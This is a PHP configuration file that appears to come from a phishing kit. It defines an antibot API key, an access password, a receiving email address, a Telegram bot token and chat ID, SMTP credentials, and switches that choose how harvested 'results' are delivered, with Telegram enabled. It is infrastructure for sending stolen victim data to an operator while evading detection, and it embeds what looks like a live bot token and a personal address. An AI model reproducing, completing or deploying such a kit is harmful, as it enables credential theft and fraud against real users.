<?php

    
    session_start();

    define("ANTIBOT_API", 'API_HERE'); // ANTIBOT.PW API
    require_once 'detect.php';
    require_once 'functions.php';

    define("PASSWORD", 'ATB');
    define("RECEIVER", 'jana-kdierdorf@outlook.com');
    define("TELEGRAM_TOKEN", '8851071424:AAHUiElLJNr2fZAgNtUlSPfoPrNEAyhWQ8Q');
    define("TELEGRAM_CHAT_ID", '-5481213535');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'Nawras0012.txt');
    define("OFFICIAL_WEBSITE", 'https://#');
    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>